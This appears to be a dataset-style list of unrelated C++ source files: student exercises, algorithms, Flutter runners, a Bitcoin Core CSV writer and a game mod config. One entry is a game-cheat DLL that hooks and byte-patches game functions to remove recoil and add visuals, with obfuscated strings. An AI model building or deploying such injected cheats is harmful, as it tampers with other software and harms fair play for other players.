    "#include<iostream>\n\nusing namespace std;\n\nint compararCadenas(char *cadena1, char *cadena2)\n{\n  int indice = 0;\n  while(cadena1[indice] != '\\0' && cadena2[indice] != '\\0') \n  {\n    if (cadena1[indice] > cadena2[indice]) \n    {\n      return 1;\n    } \n    else \n    {\n      if(cadena1[indice] < cadena2[indice])\n      {\n        return -1;\n      }\n    }\n    indice++;\n  }\n  if(cadena1[indice] == '\\0')\n  {\n    if(cadena2[indice] != '\\0') \n    {\n      return -1; \n    }\n    else \n    {\n      return 0;\n    }\n  } \n  else \n  {\n    return 1;\n  }\n}\n\nint main() \n{\n  int resultado;\n  char texto1[100];\n  char texto2[50];\n  \n  cout << \"Ingrese un texto: \"; cin >> texto1;\n  cout << \"Ingrese un texto: \"; cin >> texto2;\n\n  resultado = compararCadenas(texto1, texto2);\n\n  switch (resultado) \n  {\n    case 0:\n      cout << \"Las cadenas son iguales \";\n      break;\n    case 1:\n      cout << \"Texto1 es mayor que Texto2 \";\n      break;\n    case -1:\n      cout << \"Texto2 es mayor que Texto1 \";\n      break;\n  }\n  \n  return 0;\n}\n\n",
    "#include \"BasicWidget.h\"\n#include\"Window.h\"\n\nBasicWidget::BasicWidget(int x, int y, int w, int h)\n\t:m_x(x),m_y(y),m_w(w),m_h(h){}\n\n\nint BasicWidget::width()\n{\n\treturn m_w;\n}\n\nint BasicWidget::height()\n{\n\treturn m_h;\n\t\n}\n\nvoid BasicWidget::setFixedSize(int w, int h)\n{\n\tthis->m_w = w;\n\tthis->m_h = h;\n}\n\nint BasicWidget::x()\n{\n\treturn m_x;\n}\n\nint BasicWidget::y()\n{\n\treturn m_y;\n}\n\nvoid BasicWidget::move(int x, int y)\n{\n\tthis->m_x = x;\n\tthis->m_y = y;\n}\n\nbool BasicWidget::isIn()\n{\n\tauto& m_msg = Window::getMsg();\n\tif (m_msg.x >= m_x && m_msg.x < m_x + m_w && m_msg.y >= m_y && m_msg.y <= m_y + m_h)\n\t{\n\t\treturn true;\n\t}\n\treturn false;\n}\n\nbool BasicWidget::isClicked()\n{\n\tif (isIn())\n\t{\n\t\tauto& m_msg = Window::getMsg();\n\t\tif (m_msg.message == WM_LBUTTONDOWN)\n\t\t\treturn true;\n\t}\n\treturn false;\n}\n\nvoid BasicWidget::event()\n{\n\t//\u00c8\u00e7\u00b9\u00fb\u00ca\u00f3\u00b1\u00ea\u00c3\u00bb\u00d3\u00d0\u00d4\u00da\u00b0\u00b4\u00c5\u00a5\u00c9\u00cf\n\tif (!isIn())\n\t{\n\t\tcur_c = normal_c;\n\t}\n\telse cur_c = hover_c;\n}\nvoid BasicWidget::setBackgroundColor(COLORREF c)\n{\n\tnormal_c = c;\n}\n\nvoid BasicWidget::setHoverColor(COLORREF c)\n{\n\thover_c = c;\n}\n",
    "#include\"global.h\"\n\nbool semanticParse(){\n    logger.log(\"semanticParse\");\n    switch(parsedQuery.queryType){\n        case CLEAR: return semanticParseCLEAR();\n        case CROSS: return semanticParseCROSS();\n        case DISTINCT: return semanticParseDISTINCT();\n        case EXPORT: return semanticParseEXPORT();\n        case EXPORTMATRIX: return semanticParseEXPORTMATRIX();\n        case INDEX: return semanticParseINDEX();\n        case JOIN: return semanticParseJOIN();\n        case LIST: return semanticParseLIST();\n        case LOAD: return semanticParseLOAD();\n        case LOADMATRIX: return semanticParseLOADMATRIX();\n        case PRINT: return semanticParsePRINT();\n        case PRINTMATRIX: return semanticParsePRINTMATRIX();\n        case PROJECTION: return semanticParsePROJECTION();\n        case RENAME: return semanticParseRENAME();\n        case RENAMEMATRIX: return semanticParseRENAMEMATRIX();\n        case TRANSPOSEMATRIX: return semanticParseTRANSPOSEMATRIX();\n        case SELECTION: return semanticParseSELECTION();\n        case SORT: return semanticParseSORT();\n        case SOURCE: return semanticParseSOURCE();\n        case CHECKSYMMETRY: return semanticParseCHECKSYMMETRY();\n        case COMPUTE: return semanticParseCOMPUTE();\n        default: cout<<\"SEMANTIC ERROR\"<<endl;\n    }\n\n    return false;\n}",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   Megaphone.cpp                                      :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: kaan <kaan@student.42.de>                  +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/07/03 15:20:20 by kaan              #+#    #+#             */\n/*   Updated: 2024/07/12 09:06:04 by kaan             ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include <iostream>\n\nint main(int ac, char **av)\n{\n    std::string no_av = \"* LOUD AND UNBEARABLE FEEDBACK NOISE *\";\n\n    if (ac < 2)\n        std::cout << no_av;\n    for (int i = 1; i < ac; i++)\n    {\n        for (int j = 0; av[i][j]; j++)\n        {\n            std::cout << char(toupper(av[i][j]));\n        }\n        std::cout << \" \";\n    }\n    std::cout << \"\\n\";\n}",
    "#include <iostream>\r\n#include <vector>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nstruct Edge {\r\n    int src, dest, weight;\r\n};\r\n\r\n// Function to find the parent of a node in the disjoint set\r\nint find(vector<int>& parent, int i) {\r\n    if (parent[i] == -1)\r\n        return i;\r\n    return find(parent, parent[i]);\r\n}\r\n\r\n// Function to union two subsets\r\nvoid unionSets(vector<int>& parent, int x, int y) {\r\n    int xset = find(parent, x);\r\n    int yset = find(parent, y);\r\n    parent[xset] = yset;\r\n}\r\n\r\n// Kruskal's algorithm to find MST\r\nvoid KruskalMST(vector<Edge>& edges, int V) {\r\n    vector<Edge> result; // Store the resultant MST\r\n    int e = 0; // Number of edges in MST\r\n\r\n    // Step 1: Sort all the edges in non-decreasing order of their weight\r\n    sort(edges.begin(), edges.end(), [](Edge a, Edge b) {\r\n        return a.weight < b.weight;\r\n    });\r\n\r\n    vector<int> parent(V, -1); // Initialize parent array for disjoint set\r\n\r\n    // Step 2: Pick the smallest edge and check if it forms a cycle\r\n    for (auto& edge : edges) {\r\n        if (e == V - 1) break; // If the MST contains V-1 edges, stop\r\n\r\n        int u = find(parent, edge.src);\r\n        int v = find(parent, edge.dest);\r\n\r\n        // If including this edge doesn't cause a cycle, include it in result\r\n        if (u != v) {\r\n            result.push_back(edge);\r\n            unionSets(parent, u, v);\r\n            e++;\r\n        }\r\n    }\r\n\r\n    // Print the resultant MST\r\n    cout << \"Edges in the MST:\" << endl;\r\n    for (auto& edge : result) {\r\n        cout << edge.src << \" -- \" << edge.dest << \" == \" << edge.weight << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    int V = 4; // Number of vertices in the graph\r\n    int E = 5; // Number of edges in the graph\r\n    vector<Edge> edges(E);\r\n\r\n    // Adding edges to the graph\r\n    edges[0] = {0, 1, 10};\r\n    edges[1] = {0, 2, 6};\r\n    edges[2] = {0, 3, 5};\r\n    edges[3] = {1, 3, 15};\r\n    edges[4] = {2, 3, 4};\r\n\r\n    // Running Kruskal's algorithm\r\n    KruskalMST(edges, V);\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include \"grafoND.hpp\"\n#include \"grafoD.hpp\"\n#include <list>\n#include <vector>\nusing namespace std;\n\nint main()\n{\n    list<int> lista;\n    list<string> listaString;\n    vector<string> arreglo;\n\n    //LLENADO DE LISTA\n   /* lista.push_back(1);\n    lista.push_back(2);\n    lista.push_back(3);\n    lista.push_back(4);\n    lista.push_back(5);\n    lista.push_back(6);*/\n\n\n    GrafoDirigido <string> prueba;\n    GrafoDirigido<int> mapeado;\n    prueba.construir();\n    //prueba.setCantVert(7);\n    prueba.agregarVertice(\"hola\");\n    prueba.agregarVertice(\"andres\");\n    prueba.agregarVertice(\"games\");\n    prueba.agregarArco(\"games\", \"hola\", 8);\n    prueba.agregarArco(\"hola\", \"andres\",0);\n    //mapeado = prueba.mapear(&arreglo);\n    //mapeado.imprimirGrafo();\n    listaString = prueba.listaDFS(\"games\");\n    //cout << endl << arreglo.at(prueba.buscarMapeo(arreglo, \"games\", prueba.getCantVert()));\n\n    //lista = prueba.vertices();\n    //prueba.agregarArco(4, 3, 0);\n    //prueba.imprimirGrafo();\n    cout << endl << listaString.front() << \" \";\n    listaString.pop_front();\n    cout << endl << listaString.front() << \" \";\n    listaString.pop_front();\n    cout << endl << listaString.front();\n   // prueba.agregarVertice(4); \n    //prueba.agregarArco(3, 4); \n    //cout << prueba.getPrimero()->getProxArc()->getVertice()->getInfo(); //  \n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app_mess\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"MovingAverages.h\"\n#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <string>\n\nvoid printUsage() {\n    std::cout << \"Usage: DataPipelineProject <input_file> <output_file> <feature_range> <window_length> <methods>\\n\";\n}\n\nstd::vector<double> readData(const std::string& TestData) {\n    std::vector<double> data;\n    std::ifstream file(TestData);\n    std::string line;\n    while (std::getline(file, line)) {\n        std::stringstream ss(line);\n        double value;\n        while (ss >> value) {\n            data.push_back(value);\n            if (ss.peek() == ',') {\n                ss.ignore();\n            }\n        }\n    }\n    return data;\n}\n\nvoid writeData(const std::string& TestData, const std::vector<double>& data) {\n    std::ofstream file(TestData);\n    for (const auto& value : data) {\n        file << value << \"\\n\";\n    }\n}\n\nint main(int argc, char* argv[]) {\n    if (argc < 6) {\n        printUsage();\n        return 1;\n    }\n\n    std::string inputFile = argv[1];\n    std::string outputFile = argv[2];\n    std::string featureRange = argv[3];\n    int windowLength = std::stoi(argv[4]);\n    std::string methods = argv[5];\n\n    std::vector<double> data = readData(inputFile);\n\n    std::vector<double> result;\n    if (methods.find(\"SMA\") != std::string::npos) {\n        result = calculateSMA(data, windowLength);\n        writeData(\"SMA_\" + outputFile, result);\n    }\n    if (methods.find(\"CA\") != std::string::npos) {\n        result = calculateCA(data);\n        writeData(\"CA_\" + outputFile, result);\n    }\n    if (methods.find(\"WMA\") != std::string::npos) {\n        result = calculateWMA(data, windowLength);\n        writeData(\"WMA_\" + outputFile, result);\n    }\n    if (methods.find(\"EMA\") != std::string::npos) {\n        result = calculateEMA(data, windowLength);\n        writeData(\"EMA_\" + outputFile, result);\n    }\n    if (methods.find(\"MM\") != std::string::npos) {\n        result = calculateMM(data, windowLength);\n        writeData(\"MM_\" + outputFile, result);\n    }\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"dessante\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Copyright (c) 2011-2014 The Bitcoin Core developers\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or http://www.opensource.org/licenses/mit-license.php.\n\n#include <qt/csvmodelwriter.h>\n\n#include <QAbstractItemModel>\n#include <QFile>\n#include <QTextStream>\n\nCSVModelWriter::CSVModelWriter(const QString &_filename, QObject *parent) :\n    QObject(parent),\n    filename(_filename), model(nullptr)\n{\n}\n\nvoid CSVModelWriter::setModel(const QAbstractItemModel *_model)\n{\n    this->model = _model;\n}\n\nvoid CSVModelWriter::addColumn(const QString &title, int column, int role)\n{\n    Column col;\n    col.title = title;\n    col.column = column;\n    col.role = role;\n\n    columns.append(col);\n}\n\nstatic void writeValue(QTextStream &f, const QString &value)\n{\n    QString escaped = value;\n    escaped.replace('\"', \"\\\"\\\"\");\n    f << \"\\\"\" << escaped << \"\\\"\";\n}\n\nstatic void writeSep(QTextStream &f)\n{\n    f << \",\";\n}\n\nstatic void writeNewline(QTextStream &f)\n{\n    f << \"\\n\";\n}\n\nbool CSVModelWriter::write()\n{\n    QFile file(filename);\n    if(!file.open(QIODevice::WriteOnly | QIODevice::Text))\n        return false;\n    QTextStream out(&file);\n\n    int numRows = 0;\n    if(model)\n    {\n        numRows = model->rowCount();\n    }\n\n    // Header row\n    for(int i=0; i<columns.size(); ++i)\n    {\n        if(i!=0)\n        {\n            writeSep(out);\n        }\n        writeValue(out, columns[i].title);\n    }\n    writeNewline(out);\n\n    // Data rows\n    for(int j=0; j<numRows; ++j)\n    {\n        for(int i=0; i<columns.size(); ++i)\n        {\n            if(i!=0)\n            {\n                writeSep(out);\n            }\n            QVariant data = model->index(j, columns[i].column).data(columns[i].role);\n            writeValue(out, data.toString());\n        }\n        writeNewline(out);\n    }\n\n    file.close();\n\n    return file.error() == QFile::NoError;\n}\n",
    "#include \"ManageEmployeeLogsClass.h\"\r\n#include <iostream>\r\n#include <fstream>\r\n#include <queue>\r\n#include <stack>\r\n#include <list>\r\n#include <string>\r\n#include <ctime> \r\n\t//int ans, Y, y, N, n ;\r\n\t//bool FileSaveManageEmployeeLogs = false;\r\n\r\n\r\nusing namespace std;\r\n\r\nvoid ManageEmployeeLogsMenu(int& choice){\r\n\tEmployeeLog logManager;\r\n\r\n    do {\r\n    \tsystem(\"cls\");\r\n        cout << \"-----------------------------------------------------\" << endl;\r\n        cout << \"         Harley Report Management System             \" << endl;\r\n        cout << \"-----------------------------------------------------\" << endl;\r\n        cout << \"                                                     \" << endl;\r\n        cout << \"    Employee Logs                                   \" << endl;\r\n        cout << \"                                                     \" << endl;\r\n        cout << \"        [1] - Add Employee                           \" << endl;\r\n        cout << \"        [2] - Read Employee Logs                     \" << endl;\r\n        cout << \"        [3] - Update Logs                            \" << endl;\r\n        cout << \"        [4] - Record Time In                         \" << endl;\r\n        cout << \"        [5] - Record Time Out                        \" << endl;\r\n        cout << \"        [6] - Return Main Menu                       \" << endl;\r\n        cout << \"                                                     \" << endl;\r\n        cout << \"-----------------------------------------------------\" << endl;\r\n        cout << \": \";\r\n        cin >> choice;\r\n        cin.ignore();\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                logManager.addEmployee();\r\n                system(\"pause\");\r\n                break;\r\n            case 2:\r\n                logManager.readEmployeeLogs();\r\n                system(\"pause\");\r\n                break;\r\n            case 3:\r\n                logManager.updateLogs();\r\n                system(\"pause\");\r\n                break;\r\n            case 4:\r\n                logManager.recordTimeIn();\r\n                system(\"pause\");\r\n                break;\r\n            case 5:\r\n                logManager.recordTimeOut();\r\n                system(\"pause\");\r\n                break;\r\n            case 6:\r\n                cout << \"Returning to Main Menu...\" << endl;\r\n                system(\"cls\");\r\n                break;\r\n            default:\r\n                cout << \"Invalid choice. Please try again.\" << endl;\r\n                break;\r\n        }\r\n    } while (choice != 6);\r\n\r\n}\r\n",
    "#pragma once\n#include \"framework.h\"\n#include \"cheat/globals.hpp\"\n#include <iostream>\n#include <vector>\n#include <chrono>\n#include <ctime>\n#include <MinHook.h>\n#include \"resolver/IL2CPP_Resolver.hpp\"\n#include <cstdint>\n#include \"xorstr/xorstr.hpp\"\n#pragma comment(lib, \"libMinHook.x64.lib\")\n#include \"cheat/visuals.hpp\"\n#include \"cheat/aimbot.hpp\"\n#include \"cheat/misc.hpp\"\nusing onguifunc =  void**(__fastcall*)(int64_t);\n\nvoid memcpy_s(PVOID address, char* val, int bytes)\n{\n    DWORD d, ds;\n    VirtualProtect(address, bytes, PAGE_EXECUTE_READWRITE, &d);\n    memcpy(address, val, bytes);\n    VirtualProtect(address, bytes, d, &ds);\n}\nusing recoilconstructor = void(__fastcall*)(int64_t, float, float, float, int, int);\nrecoilconstructor trump;\nvoid recoilconstructorhk(int64_t a, float b, float c, float d, int e, int f) {\n    b = 0, c = 0, d = 0, e = 0, f = 0;\n    trump(a, b, c, d, e, f);\n}\nvoid norecoil() {\n    recoilconstructor ptr = (recoilconstructor)((DWORD64)IL2CPP::Globals.m_GameAssembly + 0x574520);\n    auto res = MH_CreateHook(ptr, &recoilconstructorhk, (LPVOID*)(&trump));\n    MH_EnableHook(ptr);\n}\n\n//make function of getinaccuracy always return 0\nvoid noinaccuracy() {\n    DWORD64 functionaddress = (DWORD64)IL2CPP::Globals.m_GameAssembly + Globals::FireArmBaseStatsGetInaccuracy;\n    memcpy_s((PVOID)functionaddress, (char*)Globals::inaccuracyreplacement, 5);\n    functionaddress = (DWORD64)IL2CPP::Globals.m_GameAssembly + Globals::FireArmRecoilPatterGetInaccuracy;\n    memcpy_s((PVOID)functionaddress, (char*)Globals::inaccuracyreplacement, 5);\n    functionaddress = (DWORD64)IL2CPP::Globals.m_GameAssembly + Globals::AutomaticActionFullautoInaccuracyget;\n    memcpy_s((PVOID)functionaddress, (char*)Globals::inaccuracyreplacement, 5);\n}\n\nLPVOID ptr;\n\n\nUnity::CGameObject* pointer = nullptr;\n\nvoid ourmain() {\n    static auto start = std::chrono::high_resolution_clock::now();\n    auto cur = std::chrono::high_resolution_clock::now();\n    static bool flag = true;\n    static int64_t(*disablefogcontroller)() = (int64_t(*)())IL2CPP::Class::Utils::GetMethodPointer(xorstr_(\"CustomRendering.FogController\"), xorstr_(\"OnDisable\"));\n    if (std::chrono::duration<double, std::milli>(cur - start).count() > 5000) {\n        disablefogcontroller();\n        start = cur;\n        if (pointer) pointer->Destroy();\n        pointer = Unity::GameObject::CreatePrimitive(Unity::GameObject::m_ePrimitiveType::Default);\n        static Unity::il2cppClass* m_pSystemTypeClass = IL2CPP::Class::Find(xorstr_(\"Mirror.GUIConsole\"));\n        static Unity::il2cppObject* m_syst = IL2CPP::Class::GetSystemType(m_pSystemTypeClass);\n        pointer->AddComponent(m_syst);\n    }\n}\n\n\nBOOL APIENTRY DllMain(HMODULE hModule,\n    DWORD  ul_reason_for_call,\n    LPVOID lpReserved\n)\n{\n    \n    MH_STATUS res;\n    onguifunc func;\n    Visuals::visibilityfunc f2 = nullptr;\n    Visuals::startfunc startfu;\n    Visuals::rangefunc f3 = nullptr;\n    Visuals::enablefogfunc f4 = nullptr;\n    Visuals::hookedfuncs.resize(15);\n    Misc::hookedfuncs.resize(20);\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n        \n        AllocConsole();\n        freopen(xorstr_(\"CONOUT$\"), \"w\", stdout);\n        res = MH_Initialize();\n\n        IL2CPP::Initialize();\n        norecoil();\n        noinaccuracy();\n        //set up hooks\n        {\n            func = (onguifunc)((DWORD64)IL2CPP::Globals.m_GameAssembly + Globals::MirrorConsoleOnGUI);\n            MH_CreateHook(func, &Visuals::visuals, &ptr);\n            MH_EnableHook(func);\n\n            Visuals::getmain = (Unity::CCamera * (__fastcall*)())IL2CPP::Class::Utils::GetMethodPointer(xorstr_(\"UnityEngine.Camera\"), xorstr_(\"get_main\"));\n            Visuals::w2s = (Unity::Vector3(__fastcall*)(Unity::CCamera*, Unity::Vector3))IL2CPP::Class::Utils::GetMethodPointer(xorstr_(\"UnityEngine.Camera\"), xorstr_(\"WorldToScreenPoint\"));\n\n            startfu = (Visuals::startfunc)IL2CPP::Class::Utils::GetMethodPointer(xorstr_(\"InventorySystem.Items.Keycards.KeycardPickup\"), \"Start\");\n            res = MH_CreateHook(startfu, &Visuals::keycardpickupstarthk, &Visuals::hookedfuncs[0]);\n            MH_EnableHook(startfu);\n\n            startfu = (Visuals::startfunc)IL2CPP::Class::Utils::GetMethodPointer(xorstr_(\"InventorySystem.Items.Pickups.ItemPickupBase\"), \"OnDestroy\");\n            res = MH_CreateHook(startfu, &Visuals::itempickupbaseondestroyhk, &Visuals::hookedfuncs[1]);\n            res = MH_EnableHook(startfu);\n\n            startfu = (Visuals::startfunc)IL2CPP::Class::Utils::GetMethodPointer(xorstr_(\"InventorySystem.Items.Pickups.ItemPickupBase\"), \"Start\");\n            res = MH_CreateHook(startfu, &Visuals::itempickupbasestarthk, &Visuals::hookedfuncs[2]);\n            res = MH_EnableHook(startfu);\n\n            startfu = (Visuals::startfunc)IL2CPP::Class::Utils::GetMethodPointer(\"InventorySystem.Items.Usables.Scp244.Scp244DeployablePickup\", \"OnDestroy\");\n            res = MH_CreateHook(startfu, &Visuals::scp244ondestroyhk, &Visuals::hookedfuncs[3",
    "#include <iostream>\n#include <vector>\n#include <fstream>\n#include <string>\n#include <ctime>\n#include <unordered_map>\n\nclass Transaccion {\npublic:\n    int id;\n    std::string cuentaOrigen;\n    std::string cuentaDestino;\n    double monto;\n    std::string ubicacion;\n    std::time_t fechaHora;\n\n    Transaccion(int _id, std::string _cuentaOrigen, std::string _cuentaDestino, double _monto, std::string _ubicacion)\n        : id(_id), cuentaOrigen(_cuentaOrigen), cuentaDestino(_cuentaDestino), monto(_monto), ubicacion(_ubicacion) {\n        fechaHora = std::time(nullptr);\n    }\n\n    void mostrarTransaccion() {\n        std::cout << \"ID: \" << id << \", Cuenta Origen: \" << cuentaOrigen << \", Cuenta Destino: \" << cuentaDestino \n                  << \", Monto: \" << monto << \", Ubicacion: \" << ubicacion << \", Fecha y Hora: \" << std::ctime(&fechaHora);\n    }\n};\n\n\nclass NodoAVL {\npublic:\n    Transaccion data;\n    NodoAVL* izquierda;\n    NodoAVL* derecha;\n    int altura;\n\n    NodoAVL(Transaccion _data) : data(_data), izquierda(nullptr), derecha(nullptr), altura(1) {}\n};\n\nclass ArbolAVL {\nprivate:\n    NodoAVL* raiz;\n\n    int altura(NodoAVL* N) {\n        if (N == nullptr)\n            return 0;\n        return N->altura;\n    }\n\n    NodoAVL* rotacionDerecha(NodoAVL* y) {\n        NodoAVL* x = y->izquierda;\n        NodoAVL* T2 = x->derecha;\n\n        x->derecha = y;\n        y->izquierda = T2;\n\n        y->altura = std::max(altura(y->izquierda), altura(y->derecha)) + 1;\n        x->altura = std::max(altura(x->izquierda), altura(x->derecha)) + 1;\n\n        return x;\n    }\n\n    NodoAVL* rotacionIzquierda(NodoAVL* x) {\n        NodoAVL* y = x->derecha;\n        NodoAVL* T2 = y->izquierda;\n\n        y->izquierda = x;\n        x->derecha = T2;\n\n        x->altura = std::max(altura(x->izquierda), altura(x->derecha)) + 1;\n        y->altura = std::max(altura(y->izquierda), altura(y->derecha)) + 1;\n\n        return y;\n    }\n\n    int getBalance(NodoAVL* N) {\n        if (N == nullptr)\n            return 0;\n        return altura(N->izquierda) - altura(N->derecha);\n    }\n\n    NodoAVL* insertar(NodoAVL* nodo, Transaccion data) {\n        if (nodo == nullptr)\n            return (new NodoAVL(data));\n\n        if (data.id < nodo->data.id)\n            nodo->izquierda = insertar(nodo->izquierda, data);\n        else if (data.id > nodo->data.id)\n            nodo->derecha = insertar(nodo->derecha, data);\n        else\n            return nodo;\n\n        nodo->altura = 1 + std::max(altura(nodo->izquierda), altura(nodo->derecha));\n\n        int balance = getBalance(nodo);\n\n        if (balance > 1 && data.id < nodo->izquierda->data.id)\n            return rotacionDerecha(nodo);\n\n        if (balance < -1 && data.id > nodo->derecha->data.id)\n            return rotacionIzquierda(nodo);\n\n        if (balance > 1 && data.id > nodo->izquierda->data.id) {\n            nodo->izquierda = rotacionIzquierda(nodo->izquierda);\n            return rotacionDerecha(nodo);\n        }\n\n        if (balance < -1 && data.id < nodo->derecha->data.id) {\n            nodo->derecha = rotacionDerecha(nodo->derecha);\n            return rotacionIzquierda(nodo);\n        }\n\n        return nodo;\n    }\n\n    void buscarTransaccion(NodoAVL* nodo, int id) {\n        if (nodo == nullptr) {\n            std::cout << \"Transaccion no encontrada.\" << std::endl;\n            return;\n        }\n\n        if (id < nodo->data.id)\n            buscarTransaccion(nodo->izquierda, id);\n        else if (id > nodo->data.id)\n            buscarTransaccion(nodo->derecha, id);\n        else\n            nodo->data.mostrarTransaccion();\n    }\n\n    void obtenerTransacciones(NodoAVL* nodo, std::vector<Transaccion>& transacciones) {\n        if (nodo != nullptr) {\n            obtenerTransacciones(nodo->izquierda, transacciones);\n            transacciones.push_back(nodo->data);\n            obtenerTransacciones(nodo->derecha, transacciones);\n        }\n    }\n\npublic:\n    ArbolAVL() : raiz(nullptr) {}\n\n    void insertar(Transaccion data) {\n        raiz = insertar(raiz, data);\n    }\n\n    void buscarTransaccion(int id) {\n        buscarTransaccion(raiz, id);\n    }\n\n    std::vector<Transaccion> obtenerTransacciones() {\n        std::vector<Transaccion> transacciones;\n        obtenerTransacciones(raiz, transacciones);\n        return transacciones;\n    }\n};\n\nclass SistemaTransacciones {\nprivate:\n    ArbolAVL arbolTransacciones;\n\npublic:\n    void registrarTransaccion(int id, std::string cuentaOrigen, std::string cuentaDestino, double monto, std::string ubicacion) {\n        Transaccion nuevaTransaccion(id, cuentaOrigen, cuentaDestino, monto, ubicacion);\n        arbolTransacciones.insertar(nuevaTransaccion);\n        std::cout << \"Transaccion registrada exitosamente.\" << std::endl;\n    }\n\n    void buscarTransaccion(int id) {\n        arbolTransacciones.buscarTransaccion(id);\n    }\n\n    void detectarTransaccionesSospechosas(double montoLimite, int frecuenciaLimite, int tiempoLimite, std::vector<Transaccion>& transaccionesSospechosas) {\n        std::vector<Transacc",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"rss_hub\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "class CfgPatches\n{\n    class WST_mkk_retextures_m1117\n    {\n        units[]= {};\n        weapons[]={};\n        requiredVersion = 0.1;\n        requiredAddons[] = {\n            \"rhsusf_c_m1117\"\n        };\n        author = \"Westalgie\";\n    };\n};\n\nclass cfgVehicles\n{\n    class LandVehicle;\n\tclass Car: LandVehicle{};\n    class Car_F: Car{};\n    class Wheeled_APC_F: Car_F{};\n    class rhsusf_M1117_base: Wheeled_APC_F\n    {\n        class textureSources\n        {\n            class standard\n            {\n                displayName = \"Woodland\";\n                author = \"$STR_RHSUSF_AUTHOR_FULL\";\n                textures[] = {\n                    \"rhsusf\\addons\\rhsusf_m1117\\data\\m1117_tex1_green_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_m1117\\data\\m1117_armour_green_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_m1117\\data\\m1117_turret_green_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_m1117\\data\\m1117_wheel_green_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_hmmwv\\textures\\A2_parts_g_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_m1a1\\duke\\data\\duke_antennae_wd_co.paa\"\n                };\n                factions[] = {};\n            };\n            class Desert\n            {\n                displayName = \"Desert\";\n                author = \"$STR_RHSUSF_AUTHOR_FULL\";\n                textures[] = {\n                    \"rhsusf\\addons\\rhsusf_m1117\\data\\m1117_tex1_co.paa\",\n                    \"rhsusf\\addons\\rhsusf_m1117\\data\\m1117_armour_co.paa\",\n                    